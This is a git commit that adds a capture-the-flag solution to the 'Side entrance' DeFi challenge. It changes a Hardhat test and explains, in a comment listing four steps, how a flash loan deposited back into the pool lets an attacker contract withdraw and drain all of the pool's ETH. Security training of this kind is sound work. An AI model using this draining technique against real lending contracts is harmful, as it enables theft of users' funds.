7f0f5481d7f3560e3fc8b2131ed02d2a2724ddc9
thanasornsawan <thanasornsawan.ploy@gmail.com>
2022-03-08 10:19:04 +0200

    add side-entrance writeup

--- test/side-entrance/side-entrance.challenge.js
+++ test/side-entrance/side-entrance.challenge.js
@@ -18,6 +18,9 @@ describe('[Challenge] Side entrance', function () {
 
         this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
 
+        const FlashloanEtherReceiverFactory = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker);
+        this.receiver = await FlashloanEtherReceiverFactory.deploy(this.pool.address, attacker.address);
+
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.equal(ETHER_IN_POOL);
@@ -25,6 +28,34 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /* Description goal is You must take all ETH from the lending pool.
+        In the function 'flashLoan' we found vulnerability because it care only balance not owner
+        and callback to the execute function outside here
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        So, we create 'FlashLoanEtherReceiver' contract which contain execute function for callback inside 
+        flashloan function and have fallback to receive ETH as receive() when withdraw money
+
+        Step1: attacker call flashloan() to ask for loan money all of pool balance
+        Step2: The SideEntranceLenderPool contract call the execute function inside attacker contract and then
+        the balance of attacker change 
+        Step3: attacker ask for withdraw all money to the attacker contract (trigger the receive fallback func.)
+        Step4: attacker transfer all of attacker contract balance to attacker balance.
+        */
+
+        console.log("Before exploit");
+        let poolBalance = await ethers.provider.getBalance(this.pool.address);
+        console.log("Pool balance :" + ethers.utils.formatEther(poolBalance.toString()));  
+        let attackerBalance = await ethers.provider.getBalance(attacker.address);
+        console.log("Attacker balance :" + ethers.utils.formatEther(attackerBalance.toString())); 
+
+        await this.receiver.executeFlashLoanAttack();
+
+        console.log("After exploit");
+        poolBalance = await ethers.provider.getBalance(this.pool.address);
+        console.log("Pool balance :" + ethers.utils.formatEther(poolBalance.toString()));  
+        attackerBalance = await ethers.provider.getBalance(attacker.address);
+        console.log("Attacker balance :" + ethers.utils.formatEther(attackerBalance.toString()));
     });
 
     after(async function () {
